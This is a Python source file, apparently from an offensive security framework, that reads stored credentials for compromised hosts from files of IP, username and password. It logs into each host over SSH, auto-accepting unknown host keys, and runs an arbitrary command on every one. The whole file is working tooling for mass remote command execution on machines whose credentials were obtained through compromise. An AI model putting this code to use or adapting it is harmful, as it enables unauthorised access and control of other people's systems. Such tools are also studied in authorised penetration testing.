import os
import sys
import glob
import time

import paramiko

from leviathan_config import BASE_DIR
from utils import get_possible_protocols_files, printProgressBar


def send_command_ssh(discovery_id, command, credentials_file=None):
    if credentials_file is None:
        if discovery_id:
            try:
                credentials_files = os.path.join(BASE_DIR, 'assets', 'compromised', '*%s.txt' % discovery_id)
                protocols, cf = get_possible_protocols_files(credentials_files)
                credentials_file = cf[0]
            except Exception as e:
                print "There is no such discovery id!!"
                print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e), e)
                return 0
        else:
            return 0
    try:
       
        with open(credentials_file, "r") as credentials:
            lines = [line.strip() for line in credentials if line.strip()]
            i = 0
            l = len(lines)
            for line in lines:
                printProgressBar(i, l, prefix='Progress:', suffix='Complete', length=50)
                tokens = line.split(":")
                ip = tokens[0]
                username = tokens[1]
                password = tokens[2]
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, username=username, password=password)
                #print "Sending command to: ", ip, "....."
                ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(command)
                i += 1 
                sys.stdout.write(printProgressBar(i, l, prefix='Progress:', suffix='Complete', length=50))
                time.sleep(0.1)
                sys.stdout.flush()
            print "\nFinished"
    except IOError:
        print "There is no such file: %s" % credentials_file


def send_to_all_ssh(command):
    credentials_files_reg = os.path.join(BASE_DIR, 'assets', 'compromised', '*_ssh_*.txt')
    credentials_files = glob.glob(credentials_files_reg)
    for cf in credentials_files:
        send_command_ssh(None,command, credentials_file=cf)

#send_command_ssh("283374","echo 'asd' > addd.txt")
#send_to_all_ssh("echo 'asd' > addd.txt")
